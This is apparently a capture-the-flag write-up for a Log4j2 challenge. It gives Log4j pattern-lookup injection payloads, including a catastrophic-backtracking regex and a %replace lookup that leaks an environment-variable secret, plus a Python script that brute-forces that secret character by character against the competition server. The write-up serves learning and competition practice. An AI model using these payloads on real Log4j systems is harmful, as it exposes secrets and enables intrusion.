## Log4J2

![](attachments/Pasted%20image%2020220707095946.png)

```sh
%replace{S${env:FLAG}E}{^SCTF.something((((((((((((((((((((.)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*E$}{}


/%replace{${env:FLAG}}{^CTF.}{${sys:cmd}}
```

```python
import requests
from string import digits, ascii_letters

url = "https://log4j2-web.2022.ctfcompetition.com/"
flag = "^CTF."
coba = digits + ascii_letters + "#-_@."

data = {"text": "/%replace{${env:FLAG}}{"+flag+"}{${sys:cmd}}"}

headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

while True:
    print(f"Flag saat ini: {flag}")
    for i in coba:
        print(f"Mencoba {i}...")
        current_flag = flag + i
        print(f"Mencoba {current_flag}...")
        data = {"text": "/%replace{${env:FLAG}}{"+current_flag+"}{${sys:cmd}}"}
        res = requests.post(url, headers=headers, data=data)
        if "Sensitive" in res.text:
            flag += i
            break
    
    if flag[-1] == ".":
        break
```


^CTF.and-you-thought-it-was-over-didnt-you.

https://www.adamsmith.haus/python/answers/how-to-make-a-list-of-the-alphabet-in-python
https://docs.python.org/3/library/string.html

